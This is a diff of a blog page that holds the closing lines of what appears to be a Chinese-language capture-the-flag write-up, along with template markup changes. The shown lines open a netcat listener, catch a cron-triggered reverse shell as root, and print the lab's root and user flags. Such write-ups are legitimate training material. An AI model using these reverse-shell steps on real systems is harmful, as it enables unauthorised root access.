-<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
 <p>等不到一分钟，cron 触发，shell 弹回来了。</p>
-<pre class="notranslate"><code class="notranslate">id
+<pre><code>id
 uid=0(root) gid=0(root)
 </code></pre>
-<pre class="notranslate"><code class="notranslate">cat /root/root.txt /home/carol/user.txt
+<pre><code>cat /root/root.txt /home/carol/user.txt
 flag{root-99dc32aab0563305b639550763a02e32}
 flag{user-548b5242171e085fc64be9252a132ad5}
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -314,7 +327,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -361,70 +374,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
